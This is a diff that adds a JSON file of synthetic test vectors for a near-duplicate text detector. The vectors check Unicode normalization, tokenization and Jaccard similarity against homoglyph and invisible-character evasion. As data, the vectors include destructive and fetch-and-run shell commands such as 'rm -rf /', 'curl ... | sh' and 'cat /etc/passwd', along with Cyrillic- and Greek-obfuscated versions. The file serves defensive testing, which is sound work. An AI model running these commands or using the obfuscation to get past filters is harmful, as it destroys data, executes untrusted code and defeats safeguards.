@@ -1,0 +1,707 @@
+{
+ "version": "neardup_tokens-v2",
+ "helper": "helpers/neardup_tokens-v2.py",
+ "supersedes": {
+  "helper": "helpers/neardup_tokens-v1.py",
+  "sha256": "50d5015a051832608391208b7fc3f48259d6e94443213bb46143a06aa2a4f173",
+  "golden_sha256": "69609b85cb779a57f071aabc4a94af300f106ea04617d956135d267454d4b7bc"
+ },
+ "note": "All text is synthetic; no pack, holdout or N content. expect \"NO_TEXT\" means the gate must refuse.",
+ "residue_vectors": [
+  {
+   "key": "0000000000000000000000000000000000000000000000000000000000000000",
+   "residue": 1,
+   "kind": "64-hex (from #90 936b6560 tests)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+   "residue": 5,
+   "kind": "64-hex (from #90 936b6560 tests)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "5abd1a7b73f7e83869b2184f86df3b1291553c5f97e81ae3565156520ed90e47",
+   "residue": 7,
+   "kind": "64-hex (from #90 936b6560 tests)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "General_Agent_113390",
+   "residue": 8,
+   "in_partition": false,
+   "kind": "raw source.uuid (sha256(uuid.encode()) % 10; no strip/casefold)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "Code_Agent_068540",
+   "residue": 7,
+   "in_partition": false,
+   "kind": "raw source.uuid (sha256(uuid.encode()) % 10; no strip/casefold)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "General_Agent_009167",
+   "residue": 9,
+   "in_partition": false,
+   "kind": "raw source.uuid (sha256(uuid.encode()) % 10; no strip/casefold)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "d3c41f80-31af-4c22-8fc2-97eabe8f401c",
+   "residue": 8,
+   "in_partition": false,
+   "kind": "raw source.uuid (sha256(uuid.encode()) % 10; no strip/casefold)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "GENERAL_AGENT_113390",
+   "residue": 3,
+   "in_partition": false,
+   "kind": "raw source.uuid (sha256(uuid.encode()) % 10; no strip/casefold)",
+   "carried_from": "v1"
+  },
+  {
+   "key": "mill-golden-raw-uuid-2",
+   "residue": 5,
+   "in_partition": true,
+   "kind": "synthetic raw uuid IN partition",
+   "carried_from": "v1"
+  },
+  {
+   "key": "mill-golden-raw-uuid-48",
+   "residue": 5,
+   "in_partition": true,
+   "kind": "synthetic raw uuid IN partition",
+   "carried_from": "v1"
+  }
+ ],
+ "normalize_vectors": [
+  {
+   "text": "RM  -F\t/Home/User/x.db",
+   "normalized": "rm -f /home/user/x.db",
+   "carried_from": "v1"
+  },
+  {
+   "text": "ｒｍ -ｆ /tmp",
+   "normalized": "rm -f /tmp",
+   "carried_from": "v1"
+  },
+  {
+   "text": "git​ push­ --force",
+   "normalized": "git push --force",
+   "carried_from": "v1"
+  },
+  {
+   "text": "line1\r\nline2 line3end",
+   "normalized": "line1 line2 line3 end",
+   "carried_from": "v1"
+  },
+  {
+   "text": "Straße ﬁle ﻿BOM",
+   "normalized": "strasse file bom",
+   "carried_from": "v1"
+  },
+  {
+   "case": "combining marks (acute, long-stroke overlay, enclosing circle)",
+   "text": "ŕm̶ -r⃝f /ḧome",
+   "normalized": "rm -rf /home",
+   "v1_normalized": "ŕm̶ -r⃝f /ḧome"
+  },
+  {
+   "case": "Cyrillic homoglyphs rm/curl",
+   "text": "гм -rf /home && сuгl http://x",
+   "normalized": "rm -rf /home && curl http://x",
+   "v1_normalized": "гм -rf /home && сuгl http://x"
+  },
+  {
+   "case": "Cyrillic lookalike set a e o p c y x i j s d q w",
+   "text": "аеорсухіјѕԁԛԝ",
+   "normalized": "aeopcyxijsdqw",
+   "v1_normalized": "аеорсухіјѕԁԛԝ"
+  },
+  {
+   "case": "Cyrillic uppercase lookalikes",
+   "text": "АВЕКМНОРСТХ",
+   "normalized": "abekmhopctx",
+   "v1_normalized": "авекмнорстх"
+  },
+  {
+   "case": "Greek lookalikes o a v p t i k",
+   "text": "οανρτικ",
+   "normalized": "oavptik",
+   "v1_normalized": "οανρτικ"
+  },
+  {
+   "case": "Greek curl / rm with Greek omicron",
+   "text": "cυrl -s hττp://x | sh",
+   "normalized": "curl -s http://x | sh",
+   "v1_normalized": "cυrl -s hττp://x | sh"
+  },
+  {
+   "case": "U+3164 / U+115F / U+1160 / U+FFA0 / U+2800 fillers",
+   "text": "rㅤmᅟ -ᅠrﾠf ⠀/",
+   "normalized": "rm -rf /",
+   "v1_normalized": "rᅠmᅟ -ᅠrᅠf ⠀/"
+  },
+  {
+   "case": "Cf + Zs + line separators",
+   "text": "git‍⁠ push 　--force origin main x",
+   "normalized": "git push --force origin main x",
+   "v1_normalized": "git push --force origin main x"
+  },
+  {
+   "case": "casefold-then-fold (Greek final sigma, Cyrillic caps)",
+   "text": "ΣΟΦΙΑ ВАШ",
+   "normalized": "ooφia baш",
+   "v1_normalized": "σοφια ваш"
+  },
+  {
+   "case": "non-whitespace control chars removed",
+   "text": "rm\u0000 -rf\u001b /",
+   "normalized": "rm -rf /",
+   "v1_normalized": "rm\u0000 -rf\u001b /"
+  },
+  {
+   "case": "variation selectors / CGJ",
+   "text": "r️m͏ -rf",
+   "normalized": "rm -rf",
+   "v1_normalized": "r️m͏ -rf"
+  },
+  {
+   "case": "plain math untouched",
+   "text": "Solve 3x + 5 = 20 for x.",
+   "normalized": "solve 3x + 5 = 20 for x.",
+   "v1_normalized": "solve 3x + 5 = 20 for x."
+  }
+ ],
+ "token_vectors": [
+  {
+   "message": "tool=shell; detail={\"command\": \"rm -f /home/user/*.db\"}",
+   "expect": {
+    "n_tokens": 17,
+    "token_set_sha256": "c6c4374160498e4710d4f694b6e43d9ad2c460fb590eff51114812a75d14c337"
+   },
+   "carried_from": "v1"
+  },
+  {
+   "message": "tool=shell; detail={\"command\": \"git reset --hard HEAD~1\"}",
+   "expect": {
+    "n_tokens": 19,
+    "token_set_sha256": "34810b5d2a78c3a75928394add07cfc938ce6bf3904e12f4210a994531f5edb2"
+   },
+   "carried_from": "v1"
+  },
+  {
+   "message": "Compute 7*8.",
+   "expect": {
+    "n_tokens": 8,
+    "token_set_sha256": "c7c335f5d4d1cac556084b2d0a43f0bd2dc3acca55c0d9c8f6394a535aefcf2f"
+   },
+   "carried_from": "v1"
+  },
+  {
+   "message": "abc",
+   "expect": {
+    "n_tokens": 1,
+    "token_set_sha256": "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
+   },
+   "carried_from": "v1"
+  },
+  {
+   "message": "",
+   "expect": "NO_TEXT",
+   "carried_from": "v1",
+   "v1_expect": {
+    "n_tokens": 1,
+    "token_set_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+   },
+   "changed": "v2: empty normalized text -> NO_TEXT (v1 gave {''})"
+  },
+  {
+   "case": "blank/format-only message",
+   "message": "​ ㅤ \t\n",
+   "expect": "NO_TEXT"
+  },
+  {
+   "case": "list-valued message",
+   "message": [
+    "tool=shell; detail={\"command\": \"rm -f /home/user/*.db\"}"
+   ],
+   "expect": {
+    "n_tokens": 17,
+    "token_set_sha256": "c6c4374160498e4710d4f694b6e43d9ad2c460fb590eff51114812a75d14c337"
+   }
+  },
+  {
+   "case": "content-part dict message",
+   "message": {
+    "type": "text",
+    "text": "Compute 7*8."
+   },
+   "expect": {
+    "n_tokens": 8,
+    "token_set_sha256": "c7c335f5d4d1cac556084b2d0a43f0bd2dc3acca55c0d9c8f6394a535aefcf2f"
+   }
+  }
+ ],
+ "row_vectors": [
+  {
+   "case": "state.message only (v1-identical)",
+   "row": {
+    "state": {
+     "message": "tool=shell; detail={\"command\": \"rm -rf /home/user/project/build\"}",
+     "meta": {}
+    }
+   },
+   "text": "rm -rf /home/user/project/build",
+   "expect": {
+    "n_tokens": 27,
+    "token_set_sha256": "ce73ed008b02ff001c8dbfd6169ad422fe70c331c991eea0fc424530e73557e4"
+   }
+  },
+  {
+   "case": "state.text only",
+   "row": {
+    "state": {
+     "text": "rm -rf /home/user/project/build"
+    }
+   },
+   "text": "rm -rf /home/user/project/build",
+   "expect": {
+    "n_tokens": 27,
+    "token_set_sha256": "ce73ed008b02ff001c8dbfd6169ad422fe70c331c991eea0fc424530e73557e4"
+   }
+  },
+  {
+   "case": "state.messages list of str",
+   "row": {
+    "state": {
+     "messages": [
+      "rm -rf",
+      "/home/user/project/build"
+     ]
+    }
+   },
+   "text": "rm -rf\n/home/user/project/build",
+   "expect": {
+    "n_tokens": 27,
+    "token_set_sha256": "ce73ed008b02ff001c8dbfd6169ad422fe70c331c991eea0fc424530e73557e4"
+   }
+  },
+  {
+   "case": "state.messages list of {role,content} with list content parts",
+   "row": {
+    "state": {
+     "messages": [
+      {
+       "role": "user",
+       "content": [
+        {
+         "type": "text",
+         "text": "rm -rf"
+        },
+        {
+         "type": "image",
+         "url": "x"
+        }
+       ]
+      },
+      {
+       "role": "assistant",
+       "content": "/home/user/project/build"
+      }
+     ]
+    }
+   },
+   "text": "rm -rf\n/home/user/project/build",
+   "expect": {
+    "n_tokens": 27,
+    "token_set_sha256": "ce73ed008b02ff001c8dbfd6169ad422fe70c331c991eea0fc424530e73557e4"
+   }
+  },
+  {
+   "case": "list-content state.message",
+   "row": {
+    "state": {
+     "message": [
+      {
+       "type": "text",
+       "text": "rm -rf"
+      },
+      "/home/user/project/build"
+     ]
+    }
+   },
+   "text": "rm -rf\n/home/user/project/build",
+   "expect": {
+    "n_tokens": 27,
+    "token_set_sha256": "ce73ed008b02ff001c8dbfd6169ad422fe70c331c991eea0fc424530e73557e4"
+   }
+  },
+  {
+   "case": "top-level prompt only",
+   "row": {
+    "prompt": "rm -rf /home/user/project/build",
+    "state": {
+     "meta": {
+      "x": 1
+     }
+    }
+   },
+   "text": "rm -rf /home/user/project/build",
+   "expect": {
+    "n_tokens": 27,
+    "token_set_sha256": "ce73ed008b02ff001c8dbfd6169ad422fe70c331c991eea0fc424530e73557e4"
+   }
+  },
+  {
+   "case": "state.question + top-level instruction (order)",
+   "row": {
+    "instruction": "second",
+    "state": {
+     "question": "first part"
+    }
+   },
+   "text": "first part\nsecond",
+   "expect": {
+    "n_tokens": 13,
+    "token_set_sha256": "0b3d48ca229614ce4c7d5e6c74f362d70319d0fdfdee86e3e122dcaee7d7ddf3"
+   }
+  },
+  {
+   "case": "all fields, documented order",
+   "row": {
+    "question": "q9",
+    "input": "q8",
+    "state": {
+     "instruction": "q7",
+     "message": "q1",
+     "text": "q2",
+     "messages": [
+      "q3",
+      {
+       "content": "q4"
+      }
+     ],
+     "prompt": "q5",
+     "input": "q6"
+    }
+   },
+   "text": "q1\nq2\nq3\nq4\nq5\nq6\nq7\nq8\nq9",
+   "expect": {
+    "n_tokens": 22,
+    "token_set_sha256": "48b11d498886fd2bc2446f7d5c13bc89745a6371eeee510bec410d8575590d33"
+   }
+  },
+  {
+   "case": "no text: ids/labels/questions/meta only -> NO_TEXT",
+   "row": {
+    "id": "ultradata-math-0000000000",
+    "state": {
+     "meta": {
+      "lang": "en"
+     }
+    },
+    "questions": {
+     "q": {
+      "instructions": "Which?"
+     }
+    },
+    "labels": {
+     "a": 1
+    }
+   },
+   "text": "NO_TEXT",
+   "expect": "NO_TEXT"
+  },
+  {
+   "case": "no text: blank/filler/non-str fields -> NO_TEXT",
+   "row": {
+    "state": {
+     "message": "ㅤ​ ",
+     "text": null,
+     "messages": [
+      1,
+      {
+       "role": "user"
+      }
+     ]
+    },
+    "prompt": 42
+   },
+   "text": "NO_TEXT",
+   "expect": "NO_TEXT"
+  },
+  {
+   "case": "non-dict row -> NO_TEXT",
+   "row": [
+    "not",
+    "a",
+    "row"
+   ],
+   "text": "NO_TEXT",
+   "expect": "NO_TEXT"
+  }
+ ],
+ "jaccard_vectors": [
+  {
+   "a": "tool=shell; detail={\"command\": \"rm -f /home/user/*.db\"}",
+   "b": "tool=shell; detail={\"command\": \"RM -F /home/user/*.DB\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "carried_from": "v1"
+  },
+  {
+   "a": "tool=shell; detail={\"command\": \"git reset --hard HEAD~1\"}",
+   "b": "tool=shell; detail={\"command\": \"git reset --hard HEAD~2\"}",
+   "expect": {
+    "jaccard": 0.9,
+    "near_dup": true
+   },
+   "carried_from": "v1"
+  },
+  {
+   "a": "tool=shell; detail={\"command\": \"git push --force origin main\"}",
+   "b": "tool=shell; detail={\"command\": \"git​ push --force origin main\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "carried_from": "v1"
+  },
+  {
+   "a": "Compute 7*8.",
+   "b": "Factor x^2-1.",
+   "expect": {
+    "jaccard": 0.0,
+    "near_dup": false
+   },
+   "carried_from": "v1"
+  },
+  {
+   "a": "tool=shell; detail={\"command\": \"ls -la /home/user\"}",
+   "b": "tool=shell; detail={\"command\": \"cat /etc/passwd | head\"}",
+   "expect": {
+    "jaccard": 0.0,
+    "near_dup": false
+   },
+   "carried_from": "v1"
+  },
+  {
+   "a": "abcdefghij",
+   "b": "abcdefgxyz",
+   "expect": {
+    "jaccard": 0.333333,
+    "near_dup": false
+   },
+   "carried_from": "v1"
+  },
+  {
+   "case": "combining-mark evasion",
+   "a": "tool=shell; detail={\"command\": \"rm -rf /home/user/project\"}",
+   "b": "tool=shell; detail={\"command\": \"ŕm̶ -r̵f /ḧome/úser/proj̀ect\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "v1_jaccard": 0.097561
+  },
+  {
+   "case": "Cyrillic rm evasion",
+   "a": "tool=shell; detail={\"command\": \"rm -rf /home/user/project\"}",
+   "b": "tool=shell; detail={\"command\": \"гм -rf /hоmе/usеr/рrојесt\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "v1_jaccard": 0.076923
+  },
+  {
+   "case": "Cyrillic curl|sh evasion",
+   "a": "tool=shell; detail={\"command\": \"curl -s https://example.com/i.sh | sh\"}",
+   "b": "tool=shell; detail={\"command\": \"сuгl -s https://еxаmplе.соm/i.ѕh | ѕh\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "v1_jaccard": 0.157895
+  },
+  {
+   "case": "Greek curl evasion",
+   "a": "tool=shell; detail={\"command\": \"curl -s https://example.com/i.sh | sh\"}",
+   "b": "tool=shell; detail={\"command\": \"cυrl -s hττps://exαmple.cοm/ι.sh | sh\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "v1_jaccard": 0.222222
+  },
+  {
+   "case": "U+3164/U+2800 filler evasion",
+   "a": "tool=shell; detail={\"command\": \"git push --force origin main\"}",
+   "b": "tool=shell; detail={\"command\": \"gㅤit pu⠀sh --fᅟorce orﾠigin maᅠin\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "v1_jaccard": 0.204545
+  },
+  {
+   "case": "NBSP/ideographic space/U+2028 evasion",
+   "a": "tool=shell; detail={\"command\": \"git push --force origin main\"}",
+   "b": "tool=shell; detail={\"command\": \"git push　--force origin main\"}",
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   },
+   "v1_jaccard": 1.0
+  },
+  {
+   "case": "unrelated short Math rows",
+   "a": "Solve 3x + 5 = 20 for x.",
+   "b": "Find the area of a circle of radius 4.",
+   "expect": {
+    "jaccard": 0.0,
+    "near_dup": false
+   },
+   "v1_jaccard": 0.0
+  },
+  {
+   "case": "unrelated short Math rows 2",
+   "a": "Compute 7*8.",
+   "b": "What is 12 divided by 3?",
+   "expect": {
+    "jaccard": 0.0,
+    "near_dup": false
+   },
+   "v1_jaccard": 0.0
+  },
+  {
+   "case": "unrelated short Math rows with Greek",
+   "a": "Let α = 2; compute α^3.",
+   "b": "Integrate sin(θ) from 0 to π.",
+   "expect": {
+    "jaccard": 0.0,
+    "near_dup": false
+   },
+   "v1_jaccard": 0.0
+  },
+  {
+   "case": "blank vs text -> NO_TEXT refused",
+   "a": "ㅤ​",
+   "b": "tool=shell; detail={\"command\": \"rm -rf /\"}",
+   "expect": "NO_TEXT",
+   "v1_jaccard": 0.0
+  }
+ ],
+ "row_jaccard_vectors": [
+  {
+   "case": "state.text-only row vs state.message row (B6-NOMSG)",
+   "a": {
+    "state": {
+     "text": "rm -rf /home/user/project/build"
+    }
+   },
+   "b": {
+    "state": {
+     "message": "tool=shell; detail={\"command\": \"rm -rf /home/user/project/build\"}",
+     "meta": {}
+    }
+   },
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   }
+  },
+  {
+   "case": "prompt-only row vs state.messages row",
+   "a": {
+    "prompt": "rm -rf /home/user/project/build",
+    "state": {
+     "meta": {
+      "x": 1
+     }
+    }
+   },
+   "b": {
+    "state": {
+     "messages": [
+      {
+       "role": "user",
+       "content": [
+        {
+         "type": "text",
+         "text": "rm -rf"
+        },
+        {
+         "type": "image",
+         "url": "x"
+        }
+       ]
+      },
+      {
+       "role": "assistant",
+       "content": "/home/user/project/build"
+      }
+     ]
+    }
+   },
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   }
+  },
+  {
+   "case": "list-content message row vs Cyrillic state.text row",
+   "a": {
+    "state": {
+     "message": [
+      {
+       "type": "text",
+       "text": "rm -rf"
+      },
+      "/home/user/project/build"
+     ]
+    }
+   },
+   "b": {
+    "state": {
+     "text": "гм -rf /hоmе/usеr/рrојесt/build"
+    }
+   },
+   "expect": {
+    "jaccard": 1.0,
+    "near_dup": true
+   }
+  },
+  {
+   "case": "no-text row vs any row -> NO_TEXT refused",
+   "a": {
+    "id": "ultradata-math-0000000000",
+    "state": {
+     "meta": {
+      "lang": "en"
+     }
+    },
+    "questions": {
+     "q": {
+      "instructions": "Which?"
+     }
+    },
+    "labels": {
+     "a": 1
+    }
+   },
+   "b": {
+    "state": {
+     "message": "tool=shell; detail={\"command\": \"rm -rf /home/user/project/build\"}",
+     "meta": {}
+    }
+   },
+   "expect": "NO_TEXT"
+  }
+ ]
+}
